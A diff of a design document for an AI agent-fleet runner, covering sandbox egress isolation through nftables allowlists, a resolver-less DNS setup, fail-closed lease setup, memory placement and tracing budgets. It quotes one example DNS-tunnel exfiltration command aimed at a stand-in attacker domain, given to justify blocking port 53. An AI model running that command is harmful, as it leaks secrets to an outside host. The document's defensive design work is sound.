-**Name resolution is parent-provided; there is no reachable resolver.** The parent renders a static `/etc/hosts` (each allowlist name → its lease-setup-resolved IP) and a resolver-less `/etc/resolv.conf`, ro-bound into the sandbox. `nftables` drops **all** child egress to port 53, so no forwarding resolver is reachable — closing the DNS-tunnel exfil channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution** (no 30-second hang), and that name rides the tool error into the fleet's turn.
+Every base chain accepts by policy and drops only on its own link, so one sandbox's table never touches another sandbox's or the host's forwarded traffic. The deleted runner's design differed here: each worker's table had a forward chain with `policy drop`, which dropped every other worker's and the host's forwarded packets.
 
-**Fail-closed + IPv4-only (launch).** If the netns/veth/nft setup fails, the lease is refused (`UZ-RUN-007`) — never run with no filter. The launch slice is IPv4; the `inet`-family chain's drop policy disposes of any IPv6 packet (Invariant 8 — a v6 allowlist entry refuses setup rather than silently bypassing the v4 filter). The hand-rolled netlink serializers (`network/{rtnetlink,nfnetlink,nfnetlink_rule}.zig`) are golden-byte tested against real `nft --debug=netlink/mnl` captures (`tests/fixtures/runner/network/`).
+**The merged allowlist.** At lease bind the supervisor merges, deduplicated in first-seen order: the runner's assigned `registry_allowlist`, or, when it is empty, the default registry set (`registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `static.crates.io`, `crates.io`, `index.crates.io`, `proxy.golang.org`, `sum.golang.org`), and the fleet's `network.allow`. A fleet that sets `read_only` keeps its hosts out of the kernel set: nf_tables cannot enforce a method, so those hosts are reached only through `http_request`, whose origin rules can. The supervisor resolves each name to IPv4 with the host resolver.
 
-> **Launch slice vs the deferred name-layer.** The above is the **launch** egress model (own-netns + host-side `nftables` IP-allowlist, resolve-at-setup) — no proxy, no resolver in the data path. When the fleet opens to untrusted/customer-operated runners with **rotating-CDN host sets** that an at-setup IP pin cannot track, the name-layer is added the **modern** way: an **eBPF/FQDN-aware datapath** that learns allowed IPs by snooping DNS *answers* and programming the same `nftables`/kernel set live — the Cilium `toFQDNs` pattern (or a minimal DNS-answer watcher updating our existing set). **No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle** — that squid-era approach is explicitly *not* the direction. It is a strict evolution of the launch datapath: pin-at-setup → pin-from-observed-DNS, same nft set. (Introducing a controlled resolver to snoop is itself the change from launch's resolver-less posture, gated to that tier.) Standing residual at every tier: an allow-listed write-capable host (e.g. `github.com`) is still an exfil channel by design — closed only by short-lived/scoped tokens, a credential-model change, not this layer.
+**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox, at the base URL the provider registry names ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.
 
-**Durable memory rides the trusted plane, never the fleet.** The runner is built `base,sqlite` (no Postgres engine), so the sandboxed child holds no datastore credential and opens no DB socket. Per-run fleet memory is captured through the control plane's authenticated channel and written to `memory.memory_entries` server-side. The untrusted child never connects to Postgres.
+**Name resolution is supervisor-provided; there is no reachable resolver.** The supervisor renders a static `/etc/hosts`, each allowlist name with its resolved address, and an `/etc/resolv.conf` naming no server, both bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable. That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.
+
+**Fail-closed and IPv4 only.** A name that does not resolve, or resolves to IPv6 alone, a set over 256 addresses, and any netlink failure each refuse the lease, and the refusal names its reason. A half-built scope is torn down, and the sandbox never starts without its rules. IPv6 egress is out of scope.
+
+**Lifecycle.** The scope is built with the sandbox, before the lease runs, and removed with it. A held sandbox is reused only when the runner's egress, its policy and its resolved set, is unchanged ([Runner execution](./runner_execution.md) §"Workspace between leases"). Building the engine sweeps every `afegress*` table and `afv*` link a crashed run left, before the first lease.
+
+**The probe.** At boot the runner builds one scope and tears it down, and reads `net.ipv4.ip_forward`. Only success reports `egress_enforcement: true`. Otherwise the daemon reads an `allow_list_egress` runner degraded with `REASON_EGRESS_ENFORCEMENT_UNAVAILABLE` and leases it nothing (`rustd/crates/afd_runner/src/reconcile.rs`). The host needs nf_tables in its kernel, `net.ipv4.ip_forward=1`, which the runner playbook sets, and no host firewall whose forward policy drops: a drop in any table's forward chain is final.
+
+> **The allowlist vs the deferred name layer.** The above is a resolve-at-bind address pin: own namespace, host-side nf_tables allowlist, no proxy and no resolver in the data path. When the fleet opens to untrusted or customer-operated runners with **rotating-CDN host sets** that a pin at bind cannot track, the name layer is added the **modern** way: an **eBPF/FQDN-aware datapath** that learns allowed addresses by snooping DNS *answers* and programming the same kernel set live — the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set. **No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle**: that squid-era approach is explicitly *not* the direction. It evolves the datapath: pin at bind → pin from observed DNS, same set. Introducing a controlled resolver to snoop is itself the change from the resolver-less posture, gated to that tier. Standing residual at every tier: an allow-listed write-capable host (for example `github.com`) is still an exfiltration channel by design, closed only by short-lived, scoped tokens, a credential-model change, not this layer.
+
+**Durable memory rides the trusted plane, never the fleet.** No runner crate links a datastore client, and the memory tools run in the supervisor, so a sandbox holds no datastore credential and opens no database socket. Per-run fleet memory is captured through the control plane's authenticated channel and written to `memory.memory_entries` server-side (§Memory continuity).
 
 ## Scaling
 
@@ -737,7 +716,7 @@ Three routes serve three different volume shapes:
  agentsfleetd ──bounded OpenTelemetry Protocol (OTLP) exporters──► otelcol-{env}
 ```
 
-The Zig runner creates no spans: its NullClaw observer returns no trace identifier. The Rust runner creates `runner.lease`, `invoke_agent`, `chat` and `execute_tool` spans and exports them to the runner collector under a fixed budget: at most 256 spans per lease, its root included, and 128 per second across the runner; a lease's root is never refused, and the rest are counted in `agentsfleet_runner_spans_suppressed_total`. Each lease is its own root trace carrying `agentsfleet.lease.id` and `agentsfleet.event.id`. It joins the daemon's `fleet.delivery` span by the event identifier, which is the only one that span carries, so no trace field crosses the runner protocol; the lease identifier tells a redelivered event's runs apart. The control plane's own trace is one selected `fleet.delivery` span after accepted settlement.
+The runner creates `runner.lease`, `invoke_agent`, `chat` and `execute_tool` spans and exports them to the runner collector under a fixed budget: at most 256 spans per lease, its root included, and 128 per second across the runner; a lease's root is never refused, and the rest are counted in `agentsfleet_runner_spans_suppressed_total`. Each lease is its own root trace carrying `agentsfleet.lease.id` and `agentsfleet.event.id`. It joins the daemon's `fleet.delivery` span by the event identifier, which is the only one that span carries, so no trace field crosses the runner protocol; the lease identifier tells a redelivered event's runs apart. The control plane's own trace is one selected `fleet.delivery` span after accepted settlement.
 
 That span stays a **custom control-plane observation**, not a claimed runner trace — a runner span joins it by attribute, never as its parent or child. Its attributes use the standard Generative Artificial Intelligence (GenAI) keys where the source fact matches (`gen_ai.operation.name=invoke_agent`, `gen_ai.agent.id`, `gen_ai.provider.name`, `gen_ai.request.model`, and typed `gen_ai.usage.*` counts) and product-namespaced `agentsfleet.*` keys for the correlation identifiers (`agentsfleet.event.id`, `agentsfleet.workspace.id`, `agentsfleet.tenant.id`). Correlation identity is allowed on a **span** precisely because it is not allowed on a **metric**: a span is a bounded per-event record, whereas a metric label creates a series that outlives the process. Prompt and response content never becomes a span attribute.
 
@@ -807,7 +786,7 @@ The exact, restart-resilient form of the two gauges is a read-only background th
 
 ## What does not change
 
-- NullClaw's fleet loop, its tool inventory, and secret substitution at the tool bridge. It moved into the runner as a linked engine and a sandboxed child, but its behaviour is identical.
+- The published tool set and secret substitution at send time: the runner's catalog carries every published tool, and its supervisor substitutes placeholders outside every sandbox ([Runner execution](./runner_execution.md) §Tool catalog, §Credentials).
 - Event ingress: steer / webhook / cron / continuation still `XADD fleet:{id}:events`.
 - The user read path: `GET /events`, the SSE live tail, `agentsfleet events`.
 - The five durable stores and their contracts (see `data_flow.md`), including row-for-row equivalence with the deleted direct path (Invariant 2 of the cutover spec).
